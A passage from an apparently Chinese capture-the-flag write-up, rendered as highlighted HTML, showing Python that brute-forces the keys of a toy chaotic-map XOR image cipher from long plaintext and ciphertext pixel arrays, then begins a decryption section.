class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">key1key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    a = testimage[i] ^ encrypt_testimage[i]</span><br><span class="line">    <span class="comment"># a 就是前16个key1和key2的组合</span></span><br><span class="line">    key1key2.append(encrypt_testimage[i] ^ a &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.999999</span></span><br><span class="line"></span><br><span class="line">list_r = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>]</span><br><span class="line">keys1 = [<span class="number">78</span>, <span class="number">177</span>]</span><br><span class="line">keys2 = [<span class="number">86</span>, <span class="number">169</span>]</span><br><span class="line"><span class="keyword">while</span> x0 &gt;= <span class="number">0.000001</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> list_r:</span><br><span class="line">        c = []</span><br><span class="line">        <span class="keyword">for</span> key1 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key2 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">        <span class="keyword">for</span> key2 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key1 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">    x0 = <span class="built_in">round</span>(x0-<span class="number">0.000001</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure>

<h3 id="三、解密"><a href="#三、解密" class="headerlink" title="三、解密"></a>三、解密</h3><p>爆出这些东西，应该就可以搞了，其实加密函数同时也是解密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span 